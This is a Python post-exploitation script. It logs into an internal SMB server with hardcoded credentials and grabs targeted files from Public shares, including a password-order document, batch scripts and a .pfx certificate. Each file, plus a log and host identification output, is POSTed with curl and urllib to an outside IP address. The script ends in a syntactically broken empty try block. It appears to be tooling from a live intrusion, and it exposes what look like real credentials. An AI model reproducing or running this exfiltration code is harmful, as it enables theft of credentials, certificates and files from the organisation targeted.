#!/usr/bin/env python3
# loot1: targeted small-file grab from Public shares, raw POST unique names
import sys, io, subprocess
sys.path.insert(0, "/tmp/imp")
from impacket.smbconnection import SMBConnection

LOG = "/tmp/.LOOT1.txt"
lf = open(LOG, "wb")
def w(s):
    if isinstance(s, str): s = s.encode("utf-8", "replace")
    lf.write(s + b"\n"); lf.flush()

IP = "10.61.10.10"
WANT = [
    ("Public_M", "\\ftp_cmd_file", "ftpcmd"),
    ("Public_M", "\\МТЗ\\накази\\Наказ пароли.odt", "np"),
    ("Public_M", "\\МТЗ\\09\\mount.cmd", "mountcmd"),
    ("Public_M", "\\МТЗ\\09\\09\\mlt_20050927_6otd\\09МЕЛИТ.bat", "bat1"),
    ("Public_M", "\\МТЗ\\09\\09\\ves_20050927_6otd\\09ВЕСЕЛОЕ.bat", "bat2"),
    ("Public_M", "\\МТЗ\\09\\09.bat", "bat3"),
    ("Public_T", "\\Documets\\1 СВ\\Полюхович\\Brandys.pfx", "pfx"),
    ("Public_T", "\\Скани\\Юрист — ярлык.lnk", "lnk1"),
]
def post(path, tag):
    subprocess.run(["curl", "-sm", "120", "-X", "POST", "--data-binary", "@" + path,
                    "http://131.123.43.239/up", "-H", "X-Name: mel2_lt_" + tag])
try:
    c = SMBConnection(IP, IP, timeout=10)
    c.login("rez", "!QAZxsw2", "MLT", "", "")
    w("login ok")
    for share, path, tag in WANT:
        try:
            bio = io.BytesIO()
            c.getFile(share, path, bio.write)
            data = bio.getvalue()
            w("OK %s %s %d" % (share, path, len(data)))
            f = "/tmp/.lt_" + tag
            open(f, "wb").write(data)
            post(f, tag)
        except Exception as e:
            w("ERR %s %s %s" % (share, path, str(e)[:120]))
    c.logoff()
except Exception as e:
    w("FATAL " + str(e)[:150])
lf.close()
subprocess.run(["curl", "-sm", "30", "-X", "POST", "--data-binary", "@" + LOG, "http://131.123.43.239/up", "-H", "X-Name: mel2_ltlog"])
print("LOOT1_DONE")

import os,base64,urllib.request as u
try:
 d=base64.b64encode(os.popen("id;hostname;uname -a").read().encode()).decode(); u.urlopen(u.Request("http://131.123.43.239/up",data=d.encode(),headers={"X-Name":"wrk_out"}),timeout=10)
except Exception: pass

try:
except Exception: pass

